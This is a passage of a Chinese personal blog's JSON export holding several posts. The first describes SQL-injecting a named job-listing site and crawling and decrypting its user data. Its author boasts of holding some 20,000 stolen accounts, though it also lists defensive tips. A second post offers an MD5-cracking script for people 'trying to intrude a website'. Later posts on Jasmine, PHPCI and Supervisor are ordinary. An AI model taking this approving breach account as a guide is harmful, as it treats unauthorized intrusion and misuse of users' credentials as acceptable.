作为被攻击并被爆表后,网站的最后一道防线,请重视一点,至少不要使用太常规的加密方式,不然真的没办法了.</p>\n</li>\n<li>\n<p>开发完成后,最好用APPScan之类的检测工具自己扫描一下,应该能发现不少问题.</p>\n</li>\n<li>\n<p>最后一点,千万不要觉得二次开发的产品就很安全,写开源软件的不都是大神,开源软件也很可能是我这样的代码猴子写出来的,所以,请还是亲力亲为地自己检查一下.</p>\n</li>\n<li>\n<p>如果以上各点枪枪全中(其实不用全中,有个2,3个就足够了),那基本上是死定了,即使是现在没有BUG,也难保在各种压力下迭代的过程不会出现BUG. 下场嘛,就和 CSDN ,或者 2000w 什么的差不多.</p>\n</li>\n</ul>\n<p>对于这种完全无视安全的网站,再恰逢解码网站测试,全部数据统统免费,只好写一个<a href=\"https://github.com/chenxiaojing123/JiuyeCrawl\">小爬虫</a>,把用户数据全部爬出来再解个密.想到以前为了帮别人搞一个学校就业账号到处问人,现在不光有了2w个账号我还能发就业信息,还是值了.</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"22","plaintext":"参考 记一次标准化SQL注入 [http://http://blog.chxj.name/standard-sql-injection/]  的流程,再次注入了\n 某网站 [http://jiuye.org],\n同时也证明程序的漏洞确实无处不在,所以作为用户千万别把什么都搁网上.作为开发者必须对自己的代码更加负责,尽可能减少被攻击的可能性以及受到攻击后将可能的危害设在一个可控的范围内,否则,很可能造成非常严重的损失.\n\n大部分程序员对自己写的代码非常有信心,认为自己编写的代码是非常严谨的而对其他方面的安全性问题放松了警惕,这往往是最危险的做法.其实,如果稍微做一点工作,即使出现漏洞,大部分攻击也很难对程序(或网站)造成实质性的破坏,以下是目前想到的一些简单的防范措施,经供参考:\n\n * 对不同的项目配置独立的数据库权限,避免因为某一个网站的漏洞而造成大面积的跨库攻击.同时,也不要给项目数据库用户提供mysql,\n   infomation_schema 等系统级数据库的权限,避免攻击者很容易就得到数据库的结构信息.\n   \n   \n * 数据表的命名不要过于常规,如 user 等,实在是太容易被猜到了.\n   \n   \n * 关闭各种报错信息,可以有效提高攻击的难度,如果不是有目的的攻击者,遇到只能盲注的一般也就放弃了.\n   \n   \n * 到现在还有大量的开发者认为MD5是安全的加密方式, google一下,做各种 Hash型密码破解 [http://www.md5.com.cn/] \n   的网站真的是越来越牛逼,8位以下的数字密码不用付费都给你了,\n   作为被攻击并被爆表后,网站的最后一道防线,请重视一点,至少不要使用太常规的加密方式,不然真的没办法了.\n   \n   \n * 开发完成后,最好用APPScan之类的检测工具自己扫描一下,应该能发现不少问题.\n   \n   \n * 最后一点,千万不要觉得二次开发的产品就很安全,写开源软件的不都是大神,开源软件也很可能是我这样的代码猴子写出来的,所以,请还是亲力亲为地自己检查一下.\n   \n   \n * 如果以上各点枪枪全中(其实不用全中,有个2,3个就足够了),那基本上是死定了,即使是现在没有BUG,也难保在各种压力下迭代的过程不会出现BUG.\n   下场嘛,就和 CSDN ,或者 2000w 什么的差不多.\n   \n   \n\n对于这种完全无视安全的网站,再恰逢解码网站测试,全部数据统统免费,只好写一个小爬虫\n[https://github.com/chenxiaojing123/JiuyeCrawl]\n,把用户数据全部爬出来再解个密.想到以前为了帮别人搞一个学校就业账号到处问人,现在不光有了2w个账号我还能发就业信息,还是值了.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2014-02-17 10:01:09","updated_at":"2016-02-12 07:26:55","published_at":"2014-02-18 03:23:30","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e66","uuid":"5353a702-b0f1-4810-9d84-d59fc39710ef","title":"Python爬虫之MD5解码","slug":"python-md5-cracker","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\t我猜Python的魅力在于就算是第一次接触也会让你感到十分亲切！\\n   \\n如果你正在尝试入侵某家网站，那md5破解也许是一个比较常见的需求。当你惊喜的发现这个网站真的只用MD5进行了一下简单加密（从经验来看，这种情况其实不少），那么接下来的工作也许是数据表信息一行一行的复制到某个或者某几个MD5破解的网站，来看一看这条加密数据是否被收录在他们数据库中。相信我，这绝对是一个非常蛋疼的过程。假如你需要100个有效用户的数据怎么办？手都点麻了结果只查了15个，伤不伤心？\\n\\n枯燥的工作还是交给小伙伴来做吧。\\n\\n以下是一个简陋的Python [MD5解密包](https://github.com/chenxiaojing123/JiuyeCrawl/blob/master/md5lib.py)（其实就一个Class (⊙ˍ⊙)而已）。程序会去几个比较大型的MD5破解网站查询并抓取数据，如果有的话就返回结果。虽然比较简陋，但无论如何，比手动的还是快多了。\\n\\n![Crawl](/content/images/2014/Feb/Screenshot_from_2014_02_20_11_51_15.png)\\n\\n破解网站的数据库也非常强大，8位以下数字、单词、拼音都能轻松查到，效率还是很高的，总的来说，表现很不错！\\n![valid data rate](/content/images/2014/Feb/Screenshot_from_2014_02_20_12_20_59.png)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><pre><code>我猜Python的魅力在于就算是第一次接触也会让你感到十分亲切！\n</code></pre>\n<p>如果你正在尝试入侵某家网站，那md5破解也许是一个比较常见的需求。当你惊喜的发现这个网站真的只用MD5进行了一下简单加密（从经验来看，这种情况其实不少），那么接下来的工作也许是数据表信息一行一行的复制到某个或者某几个MD5破解的网站，来看一看这条加密数据是否被收录在他们数据库中。相信我，这绝对是一个非常蛋疼的过程。假如你需要100个有效用户的数据怎么办？手都点麻了结果只查了15个，伤不伤心？</p>\n<p>枯燥的工作还是交给小伙伴来做吧。</p>\n<p>以下是一个简陋的Python <a href=\"https://github.com/chenxiaojing123/JiuyeCrawl/blob/master/md5lib.py\">MD5解密包</a>（其实就一个Class (⊙ˍ⊙)而已）。程序会去几个比较大型的MD5破解网站查询并抓取数据，如果有的话就返回结果。虽然比较简陋，但无论如何，比手动的还是快多了。</p>\n<p><img src=\"/content/images/2014/Feb/Screenshot_from_2014_02_20_11_51_15.png\" alt=\"Crawl\"></p>\n<p>破解网站的数据库也非常强大，8位以下数字、单词、拼音都能轻松查到，效率还是很高的，总的来说，表现很不错！<br>\n<img src=\"/content/images/2014/Feb/Screenshot_from_2014_02_20_12_20_59.png\" alt=\"valid data rate\"></p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"23","plaintext":"我猜Python的魅力在于就算是第一次接触也会让你感到十分亲切！\n\n\n如果你正在尝试入侵某家网站，那md5破解也许是一个比较常见的需求。当你惊喜的发现这个网站真的只用MD5进行了一下简单加密（从经验来看，这种情况其实不少），那么接下来的工作也许是数据表信息一行一行的复制到某个或者某几个MD5破解的网站，来看一看这条加密数据是否被收录在他们数据库中。相信我，这绝对是一个非常蛋疼的过程。假如你需要100个有效用户的数据怎么办？手都点麻了结果只查了15个，伤不伤心？\n\n枯燥的工作还是交给小伙伴来做吧。\n\n以下是一个简陋的Python MD5解密包\n[https://github.com/chenxiaojing123/JiuyeCrawl/blob/master/md5lib.py]（其实就一个Class\n(⊙ˍ⊙)而已）。程序会去几个比较大型的MD5破解网站查询并抓取数据，如果有的话就返回结果。虽然比较简陋，但无论如何，比手动的还是快多了。\n\n\n\n破解网站的数据库也非常强大，8位以下数字、单词、拼音都能轻松查到，效率还是很高的，总的来说，表现很不错！","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2014-02-20 04:35:49","updated_at":"2016-02-11 06:01:36","published_at":"2014-02-20 04:35:49","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e68","uuid":"58bcb65b-01f8-4650-9124-d4253f2df81d","title":"Javascript BDD 测试框架：Jasmine","slug":"javascript-bdd-framework-jasmine","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Jasmine是一款面向Javascript语言的BDD测试框架。BDD是在TDD的基础上衍生出的一种驱动开发方式，被称为行为驱动开发。与传统TDD的思想相比，BDD更侧重对产品需求的描述。BDD模式下的测试代码结构与敏捷开发思想中经常使用的 User Story 结构类似，从而使测试代码与自然语言更加接近，也更加便于非技术人员理解。这种开发模式常应用于程序员与非技术人员共同进行需求分析的场景。BDD的本质仍然是TDD，即通过测试优先的方式为代码的可靠性提供保障。\\n\\n通过bower可方便的将jasmine加入到项目中：\\n\\t\\n    bower install jasmine\\n\\n测试的入口为 `SpecRunner.html`，只要将源码和对应的测试引入到该文件中即可运行测试。\\n\\nJasmine定义了 `describe()`, `it()` 等方法对测试结构进行约定。Jasmine提供了丰富的断言，并且提供 `spyOn()`, `createSpy()` 等方法，将mock方法注入待测试的对象中，从而可以方便地对生产代码的行为及结果进行测试。\\n\\n\\nJasmine 也提供了十分优秀的[文档](http://jasmine.github.io/edge/introduction.html)，文档内容全部由Jasmine样例代码组成，简单明了，开发者可以十分方便地查询所需的测试方法。\\n\\n<style type=\\\"text/css\\\">\\narticle img {\\n\\twidth:80%;\\n}\\n</style>\\n\\n![Jasmine](/content/images/2014/Jul/Screen_Shot_2014_07_29_at_11_08_58_PM.png)\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>Jasmine是一款面向Javascript语言的BDD测试框架。BDD是在TDD的基础上衍生出的一种驱动开发方式，被称为行为驱动开发。与传统TDD的思想相比，BDD更侧重对产品需求的描述。BDD模式下的测试代码结构与敏捷开发思想中经常使用的 User Story 结构类似，从而使测试代码与自然语言更加接近，也更加便于非技术人员理解。这种开发模式常应用于程序员与非技术人员共同进行需求分析的场景。BDD的本质仍然是TDD，即通过测试优先的方式为代码的可靠性提供保障。</p>\n<p>通过bower可方便的将jasmine加入到项目中：</p>\n<pre><code>bower install jasmine\n</code></pre>\n<p>测试的入口为 <code>SpecRunner.html</code>，只要将源码和对应的测试引入到该文件中即可运行测试。</p>\n<p>Jasmine定义了 <code>describe()</code>, <code>it()</code> 等方法对测试结构进行约定。Jasmine提供了丰富的断言，并且提供 <code>spyOn()</code>, <code>createSpy()</code> 等方法，将mock方法注入待测试的对象中，从而可以方便地对生产代码的行为及结果进行测试。</p>\n<p>Jasmine 也提供了十分优秀的<a href=\"http://jasmine.github.io/edge/introduction.html\">文档</a>，文档内容全部由Jasmine样例代码组成，简单明了，开发者可以十分方便地查询所需的测试方法。</p>\n<style type=\"text/css\">\narticle img {\n\twidth:80%;\n}\n</style>\n<p><img src=\"/content/images/2014/Jul/Screen_Shot_2014_07_29_at_11_08_58_PM.png\" alt=\"Jasmine\"></p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"28","plaintext":"Jasmine是一款面向Javascript语言的BDD测试框架。BDD是在TDD的基础上衍生出的一种驱动开发方式，被称为行为驱动开发。与传统TDD的思想相比，BDD更侧重对产品需求的描述。BDD模式下的测试代码结构与敏捷开发思想中经常使用的\nUser Story\n结构类似，从而使测试代码与自然语言更加接近，也更加便于非技术人员理解。这种开发模式常应用于程序员与非技术人员共同进行需求分析的场景。BDD的本质仍然是TDD，即通过测试优先的方式为代码的可靠性提供保障。\n\n通过bower可方便的将jasmine加入到项目中：\n\nbower install jasmine\n\n\n测试的入口为 SpecRunner.html，只要将源码和对应的测试引入到该文件中即可运行测试。\n\nJasmine定义了 describe(), it()  等方法对测试结构进行约定。Jasmine提供了丰富的断言，并且提供 spyOn(), \ncreateSpy()  等方法，将mock方法注入待测试的对象中，从而可以方便地对生产代码的行为及结果进行测试。\n\nJasmine 也提供了十分优秀的文档 [http://jasmine.github.io/edge/introduction.html]\n，文档内容全部由Jasmine样例代码组成，简单明了，开发者可以十分方便地查询所需的测试方法。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2014-07-29 18:29:54","updated_at":"2016-02-11 05:57:08","published_at":"2014-07-29 19:08:56","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e69","uuid":"c219d7f7-53d7-414f-a1bb-2362c0586be4","title":"PHP持续集成实践: PHPCI","slug":"php-continuous-integration-phpci","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 持续集成(Continuous Integration)作为一种成熟的软件开发实践已经被广大程序员所熟知，Github上大量的开源项目也都纷纷加上Travis-CI来为自己的项目保驾护航。相信很多程序员都有过这样的经历：在与团队协作开发项目时，大部分时间大家都在各自的分支编写不同功能模块的代码，直到下一版本发布前，大家才开始开始着手将自己负责的模块合并到主分支中，这时你往往会发现，要将代码合并到主分支中甚至已经不再是一件简单的事了。自己一段时间前写的代码已经变得有点陌生，合并代码过程中一些小改动也许会在不经意间破坏整个项目，面对突然出现的大量陌生代码（其他程序员提交分支），产品上线的deadline却已经近在咫尺，原本简单的工作现在成了整个团队噩梦。\\n\\n以上只是一个假想的片段，但这样的场景却又是如此似曾相识，持续集成思想的诞生正是为了解决类似这样的问题。Martin Fowler告诉我，在敏捷的团队，我们是这样工作：在完成手头的工作（并确保新鲜的代码都有测试覆盖时），在本地执行并通过构建（至少是测试）。将主分支的代码合并到本地分支，再次执行构建确保一切OK。将代码提交到主分支版本库，等待CI系统从版本库中检出代码，并再次构建项目。此时你只需要泡一杯咖啡，静静等待CI完成构建，如果构建通过，则证明你提交的代码没有任何问题，至此，一次集成工作已经顺利完成。\\n\\n![phpci](/content/images/2015/04/Screenshot-from-2015-04-08-16-17-21.png)\\n\\n持续集成鼓励程序员们在保证构建通过的前提下，尽可能频繁地将手头的代码集成到主分支中。将代码集成作为一项最普通的日常工作，好处显而易见，团队所有的dev都能在最快时间内获得项目最新的修改，而主分支项目随时都可以上线发布。生活变得不再艰难。\\n\\nPHPCI是一款专门面向PHP项目开发的持续集成工具。尽管还算不上完美，部分插件还有一些小Bug，文档也有不完善的地方，不过总的来说也还算是差强人意。\\n![why phpci](/content/images/2015/04/phpci.PNG)\\n\\n#### 安装\\n\\n利用Composer可以非常容易的完成PHPCI的安装：\\n\\n    $ composer create-project block8/phpci phpci --keep-vcs --no-dev\\n    $ cd phpci && ../composer.phar install\\n    $ ./console phpci:install\\n\\n#### 自动构建\\n\\n执行命令使PHPCI事件监听器在后台运行，以实现自动构建\\n\\n    $ nohup php ./daemonise phpci:daemonise >/dev/null 2>&1\\n\\n\\n#### 配置\\n\\n为使项目支持PHPCI，还需要将phpci.yml配置添加到项目中。\\n\\n\\n    build_settings:\\n      ignore:\\n  \\t  - \\\"vendor\\\"\\n \\t mysql:\\n  \\t  host: \\\"localhost\\\"\\n   \\t user: \\\"root\\\"\\n    \\tpass: \\\"\\\"\\n\\n\\tsetup:\\n\\t  mysql:\\n\\t\\t- \\\"DROP DATABASE IF EXISTS test;\\\"\\n        - \\\"CREATE DATABASE test;\\\"\\n        - \\\"GRANT ALL PRIVILEGES ON test.* TO test@'localhost' IDENTIFIED BY 'test'; \\n      composer:\\n        action: \\\"install\\\"\\n    \\n    test:\\n      php_unit:\\n        directory:\\n          - \\\"src/Test\\\"\\n \\n\\tcomplete:\\n      mysql:\\n        -  \\\"DROP DATABASE IF EXISTS test;\\\"\\n\\n\\n\\n#### 为代码库添加PHPCI支持\\n\\t\\n此处以Github为例：\\n   \\n1.登陆PHPCI\\n2.点击\\\"Add Project\\\"添加一个项目，并将项目 Public key 添加到Github Deploy key 中。 \\n3.点击项目，并将项目的Webhooks添加到Github的\\\"Webhooks & Services\\\".\\n4.Webhook默认触发事件为push，将代码push到Github测试PHPCI是否可以自动构建项目。\\n\\n* 除Github（或[Git](https://www.phptesting.org/wiki/Autobuilding-From-Git)）外，PHPCI也支持包括Hg，Svn等多种版本控制工具。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><blockquote>\n<p>持续集成(Continuous Integration)作为一种成熟的软件开发实践已经被广大程序员所熟知，Github上大量的开源项目也都纷纷加上Travis-CI来为自己的项目保驾护航。相信很多程序员都有过这样的经历：在与团队协作开发项目时，大部分时间大家都在各自的分支编写不同功能模块的代码，直到下一版本发布前，大家才开始开始着手将自己负责的模块合并到主分支中，这时你往往会发现，要将代码合并到主分支中甚至已经不再是一件简单的事了。自己一段时间前写的代码已经变得有点陌生，合并代码过程中一些小改动也许会在不经意间破坏整个项目，面对突然出现的大量陌生代码（其他程序员提交分支），产品上线的deadline却已经近在咫尺，原本简单的工作现在成了整个团队噩梦。</p>\n</blockquote>\n<p>以上只是一个假想的片段，但这样的场景却又是如此似曾相识，持续集成思想的诞生正是为了解决类似这样的问题。Martin Fowler告诉我，在敏捷的团队，我们是这样工作：在完成手头的工作（并确保新鲜的代码都有测试覆盖时），在本地执行并通过构建（至少是测试）。将主分支的代码合并到本地分支，再次执行构建确保一切OK。将代码提交到主分支版本库，等待CI系统从版本库中检出代码，并再次构建项目。此时你只需要泡一杯咖啡，静静等待CI完成构建，如果构建通过，则证明你提交的代码没有任何问题，至此，一次集成工作已经顺利完成。</p>\n<p><img src=\"/content/images/2015/04/Screenshot-from-2015-04-08-16-17-21.png\" alt=\"phpci\"></p>\n<p>持续集成鼓励程序员们在保证构建通过的前提下，尽可能频繁地将手头的代码集成到主分支中。将代码集成作为一项最普通的日常工作，好处显而易见，团队所有的dev都能在最快时间内获得项目最新的修改，而主分支项目随时都可以上线发布。生活变得不再艰难。</p>\n<p>PHPCI是一款专门面向PHP项目开发的持续集成工具。尽管还算不上完美，部分插件还有一些小Bug，文档也有不完善的地方，不过总的来说也还算是差强人意。<br>\n<img src=\"/content/images/2015/04/phpci.PNG\" alt=\"why phpci\"></p>\n<h4 id=\"\">安装</h4>\n<p>利用Composer可以非常容易的完成PHPCI的安装：</p>\n<pre><code>$ composer create-project block8/phpci phpci --keep-vcs --no-dev\n$ cd phpci &amp;&amp; ../composer.phar install\n$ ./console phpci:install\n</code></pre>\n<h4 id=\"\">自动构建</h4>\n<p>执行命令使PHPCI事件监听器在后台运行，以实现自动构建</p>\n<pre><code>$ nohup php ./daemonise phpci:daemonise &gt;/dev/null 2&gt;&amp;1\n</code></pre>\n<h4 id=\"\">配置</h4>\n<p>为使项目支持PHPCI，还需要将phpci.yml配置添加到项目中。</p>\n<pre><code>build_settings:\n  ignore:\n  - &quot;vendor&quot;\n mysql:\n  host: &quot;localhost&quot;\n user: &quot;root&quot;\n\tpass: &quot;&quot;\n\nsetup:\n  mysql:\n\t- &quot;DROP DATABASE IF EXISTS test;&quot;\n    - &quot;CREATE DATABASE test;&quot;\n    - &quot;GRANT ALL PRIVILEGES ON test.* TO test@'localhost' IDENTIFIED BY 'test'; \n  composer:\n    action: &quot;install&quot;\n\ntest:\n  php_unit:\n    directory:\n      - &quot;src/Test&quot;\n\ncomplete:\n  mysql:\n    -  &quot;DROP DATABASE IF EXISTS test;&quot;\n</code></pre>\n<h4 id=\"phpci\">为代码库添加PHPCI支持</h4>\n<p>此处以Github为例：</p>\n<p>1.登陆PHPCI<br>\n2.点击&quot;Add Project&quot;添加一个项目，并将项目 Public key 添加到Github Deploy key 中。<br>\n3.点击项目，并将项目的Webhooks添加到Github的&quot;Webhooks &amp; Services&quot;.<br>\n4.Webhook默认触发事件为push，将代码push到Github测试PHPCI是否可以自动构建项目。</p>\n<ul>\n<li>除Github（或<a href=\"https://www.phptesting.org/wiki/Autobuilding-From-Git\">Git</a>）外，PHPCI也支持包括Hg，Svn等多种版本控制工具。</li>\n</ul>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"36","plaintext":"> 持续集成(Continuous\nIntegration)作为一种成熟的软件开发实践已经被广大程序员所熟知，Github上大量的开源项目也都纷纷加上Travis-CI来为自己的项目保驾护航。相信很多程序员都有过这样的经历：在与团队协作开发项目时，大部分时间大家都在各自的分支编写不同功能模块的代码，直到下一版本发布前，大家才开始开始着手将自己负责的模块合并到主分支中，这时你往往会发现，要将代码合并到主分支中甚至已经不再是一件简单的事了。自己一段时间前写的代码已经变得有点陌生，合并代码过程中一些小改动也许会在不经意间破坏整个项目，面对突然出现的大量陌生代码（其他程序员提交分支），产品上线的deadline却已经近在咫尺，原本简单的工作现在成了整个团队噩梦。\n\n\n以上只是一个假想的片段，但这样的场景却又是如此似曾相识，持续集成思想的诞生正是为了解决类似这样的问题。Martin\nFowler告诉我，在敏捷的团队，我们是这样工作：在完成手头的工作（并确保新鲜的代码都有测试覆盖时），在本地执行并通过构建（至少是测试）。将主分支的代码合并到本地分支，再次执行构建确保一切OK。将代码提交到主分支版本库，等待CI系统从版本库中检出代码，并再次构建项目。此时你只需要泡一杯咖啡，静静等待CI完成构建，如果构建通过，则证明你提交的代码没有任何问题，至此，一次集成工作已经顺利完成。\n\n\n\n持续集成鼓励程序员们在保证构建通过的前提下，尽可能频繁地将手头的代码集成到主分支中。将代码集成作为一项最普通的日常工作，好处显而易见，团队所有的dev都能在最快时间内获得项目最新的修改，而主分支项目随时都可以上线发布。生活变得不再艰难。\n\nPHPCI是一款专门面向PHP项目开发的持续集成工具。尽管还算不上完美，部分插件还有一些小Bug，文档也有不完善的地方，不过总的来说也还算是差强人意。\n\n\n安装\n利用Composer可以非常容易的完成PHPCI的安装：\n\n$ composer create-project block8/phpci phpci --keep-vcs --no-dev\n$ cd phpci && ../composer.phar install\n$ ./console phpci:install\n\n\n自动构建\n执行命令使PHPCI事件监听器在后台运行，以实现自动构建\n\n$ nohup php ./daemonise phpci:daemonise >/dev/null 2>&1\n\n\n配置\n为使项目支持PHPCI，还需要将phpci.yml配置添加到项目中。\n\nbuild_settings:\n  ignore:\n  - \"vendor\"\n mysql:\n  host: \"localhost\"\n user: \"root\"\n\tpass: \"\"\n\nsetup:\n  mysql:\n\t- \"DROP DATABASE IF EXISTS test;\"\n    - \"CREATE DATABASE test;\"\n    - \"GRANT ALL PRIVILEGES ON test.* TO test@'localhost' IDENTIFIED BY 'test'; \n  composer:\n    action: \"install\"\n\ntest:\n  php_unit:\n    directory:\n      - \"src/Test\"\n\ncomplete:\n  mysql:\n    -  \"DROP DATABASE IF EXISTS test;\"\n\n\n为代码库添加PHPCI支持\n此处以Github为例：\n\n1.登陆PHPCI\n2.点击\"Add Project\"添加一个项目，并将项目 Public key 添加到Github Deploy key 中。\n3.点击项目，并将项目的Webhooks添加到Github的\"Webhooks & Services\".\n4.Webhook默认触发事件为push，将代码push到Github测试PHPCI是否可以自动构建项目。\n\n * 除Github（或Git [https://www.phptesting.org/wiki/Autobuilding-From-Git]\n   ）外，PHPCI也支持包括Hg，Svn等多种版本控制工具。","feature_image":"http://blog.chxj.name/content/images/2015/04/Screenshot-from-2015-04-08-16-17-21.png","featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-04-08 08:09:59","updated_at":"2016-02-13 02:57:45","published_at":"2015-04-08 13:36:37","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e6a","uuid":"c1576fc1-eed1-4df5-9334-7c925df835e5","title":"用Supervisor管理后台进程","slug":"manage-process-by-supervisor","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 在服务器上时常会有一些需要在后台长时间运行的脚本，比如队列服务的监听器及某些服务的server端等。Supervisor是一套用python开发的进程管理软件，将需要长期运行的脚本交由supervisor进行管理以便对进程状态进行监控，如当进程意外终止时，supervisor能自动重启该进程，达到类似守护进程的效果。\\n\\n在 *inux 中，你可以直接通过软件源获取安装包进行安装，如：`apt-get install supervisor`，不过还是更推荐通过python软件管理工具进行安装，以便获取到较新的版本：\\n\\n`easy_install supervisor`\\n\\nSupervisor 由两个部分组成：supervisord 和 supervisorctl。supervisord是服务端，用于将指定的进程当做子进程来运行。supervisorctl是一个客户端程序，可以查看日志并通过统一的会话来控制进程。\\n\\n通过`easy_install`安装的supervisor并没有创建软件的目录及默认配置文件，推荐的目录结构最好是这样的：\\n  \\n    - etc/\\n        - supervisor/\\n            - conf.d/\\n            - supervisord.conf\\n\\n在命令行输入 `echo_supervisord_conf > /etc/supervisor/supervisord.conf` 可在该目录下生成默认的配置文件。在配置包括supervisord的监听端口，及所要管理的服务的启动方式等。默认配置文件十分详细，可根据自己的需要具体参考。\\n\\n`supervisord -c /etc/supervisor/supervisord.conf` 即可运行程序。\\n\\n比较有意思的是，supervisor还提供了一个web管理界面，以便用户能更方便的管理supervisor中的进程。\\n![supervisor-web-ctl](/content/images/2015/08/supervisor.png)\\n\\n最后介绍几个常用的控制命令：\\n\\t\\n    supervisorctl update //更新配置改变的进程，没有修改的进程则不受影响\\n    supervisorctl restart //重启进程\\n    supervisorctl reload  //重新载入配置文件\\n    supervisorctl tail  //查看输出记录\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><blockquote>\n<p>在服务器上时常会有一些需要在后台长时间运行的脚本，比如队列服务的监听器及某些服务的server端等。Supervisor是一套用python开发的进程管理软件，将需要长期运行的脚本交由supervisor进行管理以便对进程状态进行监控，如当进程意外终止时，supervisor能自动重启该进程，达到类似守护进程的效果。</p>\n</blockquote>\n<p>在 *inux 中，你可以直接通过软件源获取安装包进行安装，如：<code>apt-get install supervisor</code>，不过还是更推荐通过python软件管理工具进行安装，以便获取到较新的版本：</p>\n<p><code>easy_install supervisor</code></p>\n<p>Supervisor 由两个部分组成：supervisord 和 supervisorctl。supervisord是服务端，用于将指定的进程当做子进程来运行。supervisorctl是一个客户端程序，可以查看日志并通过统一的会话来控制进程。</p>\n<p>通过<code>easy_install</code>安装的supervisor并没有创建软件的目录及默认配置文件，推荐的目录结构最好是这样的：</p>\n<pre><code>- etc/\n    - supervisor/\n        - conf.d/\n        - supervisord.conf\n</code></pre>\n<p>在命令行输入 <code>echo_supervisord_conf &gt; /etc/supervisor/supervisord.conf</code> 可在该目录下生成默认的配置文件。在配置包括supervisord的监听端口，及所要管理的服务的启动方式等。默认配置文件十分详细，可根据自己的需要具体参考。</p>\n<p><code>supervisord -c /etc/supervisor/supervisord.conf</code> 即可运行程序。</p>\n<p>比较有意思的是，supervisor还提供了一个web管理界面，以便用户能更方便的管理supervisor中的进程。<br>\n<img src=\"/content/images/2015/08/supervisor.png\" alt=\"supervisor-web-ctl\"></p>\n<p>最后介绍几个常用的控制命令：</p>\n<pre><code>supervisorctl update //更新配置改变的进程，没有修改的进程则不受影响\nsupervisorctl restart //重启进程\nsupervisorctl reload  //重新载入配置文件\nsupervisorctl tail  //查看输出记录</code></pre>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"38","plaintext":"> 在服务器上时常会有一些需要在后台长时间运行的脚本，比如队列服务的监听器及某些服务的server端等。Supervisor是一套用python开发的进程管理软件，将需要长期运行的脚本交由supervisor进行管理以便对进程状态进行监控，如当进程意外终止时，supervisor能自动重启该进程，达到类似守护进程的效果。\n\n\n在 *inux 中，你可以直接通过软件源获取安装包进行安装，如：apt-get install supervisor\n，不过还是更推荐通过python软件管理工具进行安装，以便获取到较新的版本：\n\neasy_install supervisor\n\nSupervisor 由两个部分组成：supervisord 和\nsupervisorctl。supervisord是服务端，用于将指定的进程当做子进程来运行。supervisorctl是一个客户端程序，可以查看日志并通过统一的会话来控制进程。\n\n通过easy_install安装的supervisor并没有创建软件的目录及默认配置文件，推荐的目录结构最好是这样的：\n\n- etc/\n    - supervisor/\n        - conf.d/\n        - supervisord.conf\n\n\n在命令行输入 echo_supervisord_conf > /etc/supervisor/supervisord.conf \n可在该目录下生成默认的配置文件。在配置包括supervisord的监听端口，及所要管理的服务的启动方式等。默认配置文件十分详细，可根据自己的需要具体参考。\n\nsupervisord -c /etc/supervisor/supervisord.conf  即可运行程序。\n\n比较有意思的是，supervisor还提供了一个web管理界面，以便用户能更方便的管理supervisor中的进程。\n\n\n最后介绍几个常用的控制命令：\n\nsupervisorctl update //更新配置改变的进程，没有修改的进程则不受影响\nsupervisorctl restart //重启进程\nsupervisorctl reload  //重新载入配置文件\nsupervisorctl tail  //查看输出记录","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":"用Supervisor管理后台进程","meta_description":"supervisor Linux 进程管理","author_id":"1","created_at":"2015-04-15 16:24:02","updated_at":"2016-02-11 05:52:42","published_at":"2015-08-12 16:07:22","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e6b","uuid":"e7cd46ed-2924-4c1f-9d34-4d100b131e02","title":"优雅的PHP微型框架: Silex","slug":"awsome-php-micro-framework-silex","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 